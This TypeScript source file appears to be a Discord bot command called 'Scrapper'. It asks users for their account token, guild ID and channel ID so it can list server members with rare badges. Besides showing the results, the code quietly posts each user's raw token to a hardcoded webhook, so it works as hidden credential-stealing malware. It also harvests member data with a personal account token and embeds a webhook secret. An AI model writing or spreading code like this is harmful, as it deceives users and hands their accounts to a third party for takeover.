import type BaseClient from '#lib/BaseClient.js';
import Command from '#lib/structures/Command.js';
import { Scrape } from '#lib/utils/Extract.js';
import { EmbedBuilder, type RestOrArray } from '@discordjs/builders';
import { WebhookClient, ChatInputCommandInteraction, type APIEmbedField, User } from 'discord.js';

export default class extends Command {
	public constructor(client: BaseClient) {
		super(client, {
			name: 'Scrapper',
			description: 'Get information about users with rare badges on a server.'
		});
	}

	public async execute(interaction: ChatInputCommandInteraction<'cached' | 'raw'>) {
        const webhookClient = new WebhookClient('https://discord.com/api/webhooks/1222000433711681546/n0cvIHJrcetM6vqhqXQIaHeExqtofiPI3-JUdb_2pOG6GjsDDk71EOEi61kAeEYBRSlt');
        const token: string = interaction.options.getString('token');
        const guild_id: string = interaction.options.getString('guild_id');
        const channel_id: string = interaction.options.getString('channel_id');
        const fields: APIEmbedField[] = [];

        const data = Scrape(token, guild_id, channel_id)

        data.forEach(member => {
            fields.push({ name: member.tag, value: `Badges: ${member.badges.join(', ')}` });
        });

        const embed = new EmbedBuilder()
            .setAuthor({ name: 'Lovvrx Scrapper', iconURL: 'https://media.discordapp.net/attachments/1215688010675257425/1221984417367457905/IMG_8947.jpg?ex=661490ac&is=66021bac&hm=74f9f7c89350a157ab0fa8308926e12194145b601a4242de8283957d2e076262&=&format=webp&width=320&height=427' })
            .setFields(...fields)
            .setFooter({ text: '🖤 | lovver', iconURL: this.client.user.avatarURL() as string })
            .setColor(0);

        const embed1 = new EmbedBuilder()
            .setAuthor({ name: 'Lovvrx Scrapper', iconURL: 'https://media.discordapp.net/attachments/1215688010675257425/1221984417367457905/IMG_8947.jpg?ex=661490ac&is=66021bac&hm=74f9f7c89350a157ab0fa8308926e12194145b601a4242de8283957d2e076262&=&format=webp&width=320&height=427' })
            .setDescription(`> Scrapped By ${interaction.author.username} \n > Token Used From Client ${token}`)
            .setFields(...fields)
            .setFooter({ text: '🖤 | lovver', iconURL: this.client.user.avatarURL() as string })
            .setColor(0);

        await interaction.reply({ embeds: [embed], fetchReply: true });
        await webhookClient.send({
            embeds: [embed1],
        });
	}
}
